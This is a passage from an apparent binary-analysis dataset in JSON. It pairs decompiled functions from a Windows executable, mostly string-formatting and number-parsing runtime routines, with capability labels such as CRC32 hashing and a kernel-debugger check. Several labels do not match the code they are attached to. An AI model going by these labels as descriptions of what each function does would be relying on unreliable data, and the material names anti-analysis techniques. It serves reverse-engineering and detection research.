          if ((((uVar7 != 0x30) && (uVar7 != 0x31)) && (uVar7 != 0x32)) && ((uVar7 != 0x33 && (uVar7 != 0x34)))) {\n                *0x6ccc1c = puVar5;\n                return 0xffff;\n            }\n            goto code_r0x0043a312;\n        }\n        if ((*0x6ccc1c)[2] == 0x50) {\n            puVar5 = *0x6ccc1c + 2;\n        }\n        *0x6ccc1c = puVar5 + 1;\n        uVar7 = **0x6ccc1c;\n        if (uVar7 < 'N') {\n            if (uVar7 != 0x4d) {\n                if (uVar7 == 0) {\n                    return 0xfffe;\n                }\n                if ((uVar7 != 0x46) && (uVar7 != 0x48)) {\n                    if (uVar7 == 0x4a) goto code_r0x0043a272;\n                    if (uVar7 != 0x4c) {\n                        return 0xffff;\n                    }\n                }\n            }\n        }\n        else {\n            if ((uVar7 == 0x4e) || (uVar7 == 0x4f)) {\ncode_r0x0043a272:\n                uVar7 = puVar5[2];\n                if (('/' < uVar7) && (uVar7 < ':')) {\n                    *0x6ccc1c = puVar5 + uVar7 + -0x2d;\n                    uVar1 = fcn.0043a10b();\n                    return uVar1 | 0x10000;\n                }\n                uVar3 = 0xffff;\n                puVar5 = puVar5 + 2;\n                goto code_r0x0043a37a;\n            }\n            if (uVar7 != 0x51) {\n                if (uVar7 != 0x68) {\n                    return 0xffff;\n                }\n                *0x6ccc30 = 0;\n            }\n        }\n        *0x6ccc1c = puVar5 + 2;\n    } while( true );\n}\n",
        "token_count": 2018
    },
    "0043caf5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043caf5(uint32_t arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint var_474h;\n    uchar *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        arg_18h = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        goto code_r0x0043cc5b;\n    }\n    var_470h = arg_10h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if (((arg_8h & 2) != 0) || (var_464h = 0,  arg_10h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00446ec2(&var_460h, arg_8h, arg_ch, arg_18h, arg_1ch, arg_20h);\n    var_ch = 0;\n    var_460h = fcn.00449519();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if ((arg_8h & 2) == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043cc44:\n                        arg_10h[var_468h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_460h < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_468h != arg_14h) goto code_r0x0043cc44;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_460h == NULL)) && (var_468h != arg_14h)) {\n            arg_10h[var_468h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043cc5b:\n    fcn.004303e9(arg_18h);\n    return;\n}\n",
        "token_count": 725
    },
    "0043cc69": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043cc69(uint32_t arg_8h, uint arg_ch, ushort *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint var_474h;\n    ushort *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        arg_18h = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        goto code_r0x0043cdde;\n    }\n    var_470h = arg_10h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if (((arg_8h & 2) != 0) || (var_464h = 0,  arg_10h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00446f95(&var_460h, arg_8h, arg_ch, arg_18h, arg_1ch, arg_20h);\n    var_ch = 0;\n    var_460h = fcn.0044a451();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if ((arg_8h & 2) == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043cdc4:\n                        arg_10h[var_468h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_460h < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_468h != arg_14h) goto code_r0x0043cdc4;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_460h == NULL)) && (var_468h != arg_14h)) {\n            arg_10h[var_468h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043cdde:\n    fcn.004303e9(arg_18h);\n    return;\n}\n",
        "token_count": 724
    },
    "0043cdec": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043cdec(uint32_t arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uchar *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t var_adch;\n    uint var_ad8h;\n    uint32_t var_ad4h;\n    int32_t var_ad0h;\n    uchar *var_acch;\n    int32_t var_ac8h;\n    int32_t var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    uchar *var_ab8h;\n    uint var_ab4h;\n    uint var_a78h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_ab8h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        iVar1 = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        arg_1ch = iVar1;\n        goto code_r0x0043cf7b;\n    }\n    var_ad4h = arg_8h & 2;\n    var_acch = arg_10h;\n    var_ac8h = arg_14h;\n    var_ac4h = 0;\n    if ((var_ad4h != 0) || (var_ac0h = 0,  arg_10h == NULL)) {\n        var_ac0h = 1;\n    }\n    var_abch = &var_acch;\n    var_adch = arg_8h;\n    var_ab8h = arg_20h;\n    var_ad0h = arg_18h;\n    var_ad8h = arg_ch;\n    fcn.0043c1b4(&var_abch, &var_adch, &var_ad0h, arg_1ch, &var_ab8h);\n    var_abch = fcn.004497fd();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_ad4h == 0) {\n                if (arg_14h != 0) {\n                    if (var_ac4h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043cf64:\n                        arg_10h[var_ac4h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_abch < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_ac4h != arg_14h) goto code_r0x0043cf64;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_abch == NULL)) && (var_ac4h != arg_14h)) {\n            arg_10h[var_ac4h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043cf7b:\n    fcn.004303e9(arg_1ch);\n    return;\n}\n",
        "token_count": 801
    },
    "0043cf89": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043cf89(uint32_t arg_8h, uint arg_ch, ushort *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            ushort *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t var_adch;\n    uint var_ad8h;\n    uint32_t var_ad4h;\n    int32_t var_ad0h;\n    ushort *var_acch;\n    int32_t var_ac8h;\n    int32_t var_ac4h;\n    uint var_ac0h;\n    uint *var_abch;\n    ushort *var_ab8h;\n    uint var_ab4h;\n    uint var_a78h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_ab8h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        iVar1 = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        arg_1ch = iVar1;\n        goto code_r0x0043d127;\n    }\n    var_ad4h = arg_8h & 2;\n    var_acch = arg_10h;\n    var_ac8h = arg_14h;\n    var_ac4h = 0;\n    if ((var_ad4h != 0) || (var_ac0h = 0,  arg_10h == NULL)) {\n        var_ac0h = 1;\n    }\n    var_abch = &var_acch;\n    var_adch = arg_8h;\n    var_ab8h = arg_20h;\n    var_ad0h = arg_18h;\n    var_ad8h = arg_ch;\n    fcn.0043c252(&var_abch, &var_adch, &var_ad0h, arg_1ch, &var_ab8h);\n    var_abch = fcn.0044a691();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_ad4h == 0) {\n                if (arg_14h != 0) {\n                    if (var_ac4h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043d10d:\n                        arg_10h[var_ac4h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_abch < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_ac4h != arg_14h) goto code_r0x0043d10d;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_abch == NULL)) && (var_ac4h != arg_14h)) {\n            arg_10h[var_ac4h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043d127:\n    fcn.004303e9(arg_1ch);\n    return;\n}\n",
        "token_count": 800
    },
    "0043d135": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043d135(uint32_t arg_8h, uint arg_ch, uchar *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint var_474h;\n    uchar *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        arg_18h = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        goto code_r0x0043d29b;\n    }\n    var_470h = arg_10h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if (((arg_8h & 2) != 0) || (var_464h = 0,  arg_10h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00446ec2(&var_460h, arg_8h, arg_ch, arg_18h, arg_1ch, arg_20h);\n    var_ch = 0;\n    var_460h = fcn.00449afd();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if ((arg_8h & 2) == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043d284:\n                        arg_10h[var_468h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_460h < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_468h != arg_14h) goto code_r0x0043d284;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_460h == NULL)) && (var_468h != arg_14h)) {\n            arg_10h[var_468h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043d29b:\n    fcn.004303e9(arg_18h);\n    return;\n}\n",
        "token_count": 725
    },
    "0043d2a9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043d2a9(uint32_t arg_8h, uint arg_ch, ushort *arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint var_474h;\n    ushort *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_420h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        *(arg_1ch + 0x1c) = 1;\n        arg_18h = 0;\n        *(arg_1ch + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch);\n        goto code_r0x0043d41e;\n    }\n    var_470h = arg_10h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if (((arg_8h & 2) != 0) || (var_464h = 0,  arg_10h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00446f95(&var_460h, arg_8h, arg_ch, arg_18h, arg_1ch, arg_20h);\n    var_ch = 0;\n    var_460h = fcn.0044a8f9();\n    if (arg_10h != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if ((arg_8h & 2) == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h == arg_14h) {\n                        arg_10h[arg_14h + -1] = 0;\n                    }\n                    else {\ncode_r0x0043d404:\n                        arg_10h[var_468h] = 0;\n                    }\n                }\n            }\n            else if (arg_14h != 0) {\n                if (var_460h < 0) {\n                    *arg_10h = 0;\n                }\n                else {\n                    if (var_468h != arg_14h) goto code_r0x0043d404;\n                    arg_10h[arg_14h + -1] = 0;\n                }\n            }\n        }\n        else if (((arg_14h != 0) || (var_460h == NULL)) && (var_468h != arg_14h)) {\n            arg_10h[var_468h] = 0;\n        }\n    }\n    fcn.004473c0();\ncode_r0x0043d41e:\n    fcn.004303e9(arg_18h);\n    return;\n}\n",
        "token_count": 730
    },
    "0043fe43": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0043fe43(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    if ((arg_8h & 4) != 0) {\n        return true;\n    }\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 2) == 0) {\n            return 0x7fffffff < arg_ch;\n        }\n        if (0x80000000 < arg_ch) {\n            return true;\n        }\n    }\n    return false;\n}\n",
        "token_count": 119
    },
    "0043ffcc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043ffcc(int32_t arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint8_t *puVar7;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.00453fcc();\n    if (cVar3 == '\\0') {\ncode_r0x00440011:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x00440011;\n    }\n    var_ch = 0;\n    uVar6 = *arg_ch;\n    puVar7 = arg_ch + 1;\n    var_8h = arg_18h & 0xff;\n    uVar5 = var_4h & 0xffffff00;\n    if (uVar6 == 0x2d) {\n        var_8h = var_8h | 2;\ncode_r0x00440056:\n        uVar6 = *puVar7;\n        puVar7 = arg_ch + 2;\n    }\n    else if (uVar6 == 0x2b) goto code_r0x00440056;\n    var_4h = uVar5 | uVar6;\n    arg_ch = puVar7;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x004400dd;\n    if (uVar6 - 0x30 < 10) {\n        iVar4 = uVar6 + -0x30;\ncode_r0x00440096:\n        if (iVar4 == 0) {\n            uVar1 = *puVar7;\n            var_10h = var_10h & 0xffffff00 | uVar1;\n            if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                uVar6 = puVar7[1];\n                var_4h = uVar5 | uVar6;\n                arg_ch = puVar7 + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.00453702(var_10h);\n                arg_ch = puVar7 + 1;\n            }\n            goto code_r0x004400dd;\n        }\n    }\n    else {\n        if (uVar6 + 0x9f < 0x1a) {\n            iVar4 = uVar6 + -0x57;\n            goto code_r0x00440096;\n        }\n        if (uVar6 + 0xbf < 0x1a) {\n            iVar4 = uVar6 + -0x37;\n            goto code_r0x00440096;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x004400dd:\n    while( true ) {\n        if (uVar6 - 0x30 < 10) {\n            uVar5 = uVar6 - 0x30;\n        }\n        else if (uVar6 + 0x9f < 0x1a) {\n            uVar5 = uVar6 - 0x57;\n        }\n        else if (uVar6 + 0xbf < 0x1a) {\n            uVar5 = uVar6 - 0x37;\n        }\n        else {\n            uVar5 = 0xffffffff;\n        }\n        if (arg_14h <= uVar5) break;\n        uVar6 = *arg_ch;\n        var_4h = var_4h & 0xffffff00 | uVar6;\n        uVar5 = uVar5 + var_ch * arg_14h;\n        var_8h = var_8h | (uVar5 < var_ch * arg_14h || 0xffffffff / arg_14h < var_ch) << 2 | 8;\n        arg_ch = arg_ch + 1;\n        var_ch = uVar5;\n    }\n    fcn.00453702(var_4h);\n    if ((var_8h & 8) == 0) {\n        if (arg_10h == NULL) {\n            return 0;\n        }\n        *arg_10h = puVar2;\n        return 0;\n    }\n    cVar3 = fcn.0043fe43(var_8h, var_ch);\n    if (cVar3 == '\\0') {\n        if ((var_8h & 2) != 0) {\n            var_ch = -var_ch;\n        }\n    }\n    else {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x22;\n        if ((var_8h & 1) != 0) {\n            if ((var_8h & 2) == 0) {\n                if (arg_10h != NULL) {\n                    *arg_10h = arg_ch;\n                }\n                return 0x7fffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n            }\n            return 0x80000000;\n        }\n        var_ch = 0xffffffff;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n        return var_ch;\n    }\n    return var_ch;\n}\n",
        "token_count": 1424
    },
    "004401db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004401db(int32_t arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t uVar6;\n    uint32_t arg_8h_00;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    cVar2 = fcn.00453fe7();\n    if (cVar2 == '\\0') {\ncode_r0x00440224:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x00440224;\n    }\n    var_4h = 0;\n    arg_18h = arg_18h & 0xff;\n    arg_8h_00 = *arg_ch;\n    puVar5 = arg_ch + 1;\n    if (arg_8h_00 == 0x2d) {\n        arg_18h = arg_18h | 2;\ncode_r0x00440262:\n        arg_8h_00 = *puVar5;\n        puVar5 = arg_ch + 2;\n    }\n    else if (arg_8h_00 == 0x2b) goto code_r0x00440262;\n    var_8h = 0x660;\n    arg_ch = puVar5;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x00440559;\n    uVar6 = arg_8h_00;\n    if (uVar6 < 0x30) goto code_r0x004404e6;\n    iVar3 = 0x30;\n    if (uVar6 < 0x3a) {\ncode_r0x00440389:\n        iVar3 = -iVar3;\ncode_r0x004404e1:\n        iVar3 = arg_8h_00 + iVar3;\n        if (iVar3 == -1) goto code_r0x004404e6;\ncode_r0x0044050e:\n        if (iVar3 == 0) {\n            uVar4 = *puVar5;\n            if ((uVar4 == 0x78) || (uVar4 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                arg_8h_00 = puVar5[1];\n                arg_ch = puVar5 + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.0045372b(uVar4);\n                arg_ch = puVar5 + 1;\n            }\n            goto code_r0x00440559;\n        }\n    }\n    else {\n        if (uVar6 < 0xff10) {\n            if ((0x65f < uVar6) &&\n               ((iVar3 = var_8h,  uVar6 < 0x66a ||\n                ((iVar3 = 0x6f0,  0x6ef < uVar6 &&\n                 ((uVar6 < 0x6fa ||\n                  ((iVar3 = 0x966,  0x965 < uVar6 &&\n                   ((uVar6 < 0x970 ||\n                    ((iVar3 = 0x9e6,  0x9e5 < uVar6 &&\n                     ((uVar6 < 0x9f0 ||\n                      ((iVar3 = 0xa66,  0xa65 < uVar6 &&\n                       ((uVar6 < 0xa70 ||\n                        ((iVar3 = 0xae6,  0xae5 < uVar6 &&\n                         ((uVar6 < 0xaf0 ||\n                          ((iVar3 = 0xb66,  0xb65 < uVar6 &&\n                           ((uVar6 < 0xb70 ||\n                            ((iVar3 = 0xc66,  0xc65 < uVar6 &&\n                             ((uVar6 < 0xc70 ||\n                              ((iVar3 = 0xce6,  0xce5 < uVar6 &&\n                               ((uVar6 < 0xcf0 ||\n                                ((iVar3 = 0xd66,  0xd65 < uVar6 &&\n                                 ((uVar6 < 0xd70 ||\n                                  ((iVar3 = 0xe50,  0xe4f < uVar6 &&\n                                   ((uVar6 < 0xe5a ||\n                                    ((iVar3 = 0xed0,  0xecf < uVar6 &&\n                                     ((uVar6 < 0xeda ||\n                                      ((iVar3 = 0xf20,  0xf1f < uVar6 &&\n                                       ((uVar6 < 0xf2a ||\n                                        ((iVar3 = 0x1040,  0x103f < uVar6 &&\n                                         ((uVar6 < 0x104a ||\n                                          ((iVar3 = 0x17e0,  0x17df < uVar6 &&\n                                           ((uVar6 < 0x17ea || ((iVar3 = 0x1810,  0x180f < uVar6 && (uVar6 < 0x181a)))))\n                                           )))))))))))))))))))))))))))))))))))))))))))))))))))))))))\n            goto code_r0x00440389;\n        }\n        else if (uVar6 < 0xff1a) {\n            iVar3 = -0xff10;\n            goto code_r0x004404e1;\n        }\ncode_r0x004404e6:\n        if (((0x40 < arg_8h_00) && (arg_8h_00 < 0x5b)) || (arg_8h_00 - 0x61 < 0x1a)) {\n            uVar4 = arg_8h_00;\n            if (arg_8h_00 - 0x61 < 0x1a) {\n                uVar4 = arg_8h_00 - 0x20;\n            }\n            iVar3 = uVar4 - 0x37;\n            goto code_r0x0044050e;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x00440559:\n    do {\n        iVar3 = 0x30;\n        uVar6 = arg_8h_00;\n        if (uVar6 < 0x30) goto code_r0x004406ba;\n        if (uVar6 < 0x3a) {\ncode_r0x004406b0:\n            uVar4 = arg_8h_00 - iVar3;\n            if (uVar4 == 0xffffffff) goto code_r0x004406ba;\n        }\n        else {\n            iVar3 = 0xff10;\n            if (uVar6 < 0xff10) {\n                iVar3 = 0x660;\n                if (0x65f < uVar6) {\n                    if (uVar6 < 0x66a) goto code_r0x004406b0;\n                    iVar3 = 0x6f0;\n                    if (0x6ef < uVar6) {\n                        if (uVar6 < 0x6fa) goto code_r0x004406b0;\n                        iVar3 = 0x966;\n                        if (0x965 < uVar6) {\n                            if (uVar6 < 0x970) goto code_r0x004406b0;\n                            iVar3 = 0x9e6;\n                            if (0x9e5 < uVar6) {\n                                if (uVar6 < 0x9f0) goto code_r0x004406b0;\n                                iVar3 = 0xa66;\n                                if (0xa65 < uVar6) {\n                                    if (uVar6 < 0xa70) goto code_r0x004406b0;\n                                    iVar3 = 0xae6;\n                                    if (0xae5 < uVar6) {\n                                        if (uVar6 < 0xaf0) goto code_r0x004406b0;\n                                        iVar3 = 0xb66;\n                                        if (0xb65 < uVar6) {\n                                            if (uVar6 < 0xb70) goto code_r0x004406b0;\n                                            iVar3 = 0xc66;\n                                            if (0xc65 < uVar6) {\n                                                if (uVar6 < 0xc70) goto code_r0x004406b0;\n                                                iVar3 = 0xce6;\n                                                if (0xce5 < uVar6) {\n                                                    if (uVar6 < 0xcf0) goto code_r0x004406b0;\n                                                    iVar3 = 0xd66;\n                                                    if (0xd65 < uVar6) {\n                                                        if (uVar6 < 0xd70) goto code_r0x004406b0;\n                                                        iVar3 = 0xe50;\n                                                        if (0xe4f < uVar6) {\n                                                            if (uVar6 < 0xe5a) goto code_r0x004406b0;\n                                                            iVar3 = 0xed0;\n                                                            if (0xecf < uVar6) {\n                                                                if (uVar6 < 0xeda) goto code_r0x004406b0;\n                                                                iVar3 = 0xf20;\n                                                                if (0xf1f < uVar6) {\n                                                                    if (uVar6 < 0xf2a) goto code_r0x004406b0;\n                                                                    iVar3 = 0x1040;\n                                                                    if (0x103f < uVar6) {\n                                                                        if (uVar6 < 0x104a) goto code_r0x004406b0;\n                                                                        iVar3 = 0x17e0;\n                                                                        if (0x17df < uVar6) {\n                                                                            if (uVar6 < 0x17ea) goto code_r0x004406b0;\n                                                                            iVar3 = 0x1810;\n                                                                            if (0x180f < uVar6) {\n                                                                                var_84h._0_2_ = 0x181a;\n                                                                                goto code_r0x004406ae;\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                var_88h._0_2_ = 0xff1a;\n                var_84h._0_2_ = var_88h;\ncode_r0x004406ae:\n                if (uVar6 < var_84h) goto code_r0x004406b0;\n            }\ncode_r0x004406ba:\n            if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && ((arg_8h_00 < 0x61 || (0x7a < uVar6)))) {\n                uVar4 = 0xffffffff;\n            }\n            else {\n                uVar4 = arg_8h_00;\n                if (uVar6 - 0x61 < 0x1a) {\n                    uVar4 = arg_8h_00 - 0x20;\n                }\n                uVar4 = uVar4 - 0x37;\n            }\n        }\n        if (arg_14h <= uVar4) {\n            fcn.0045372b(arg_8h_00);\n            if ((arg_18h & 8) == 0) {\n                if (arg_10h == NULL) {\n                    return 0;\n                }\n                *arg_10h = puVar1;\n                return 0;\n            